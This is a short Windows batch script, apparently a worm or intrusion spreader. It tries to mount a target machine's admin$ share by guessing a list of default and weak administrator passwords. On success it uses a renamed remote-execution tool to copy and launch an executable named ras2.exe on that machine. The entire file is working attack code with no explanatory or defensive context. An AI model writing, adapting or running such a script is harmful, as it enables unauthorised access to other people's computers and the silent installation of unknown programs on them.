@echo off
net use /del \\%1\admin$
net use \\%1\admin$ "" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "Administrator" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "test" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "test" /user:"test"
if not errorlevel 1 goto admin
net use \\%1\admin$ "test123" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "temp" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "temp123" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "pass" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "password" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "admin" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "root" /user:"root"
if not errorlevel 1 goto admin
net use \\%1\admin$ "changeme" /user:"Administrator"
if not errorlevel 1 goto admin
net use \\%1\admin$ "admin" /user:"admin"
if not errorlevel 1 goto admin
:admin
x \\%1 attrib.exe -r ras2.exe
x \\%1 -f -c -d ras2.exe -o
x \\%1 -d ras2.exe -o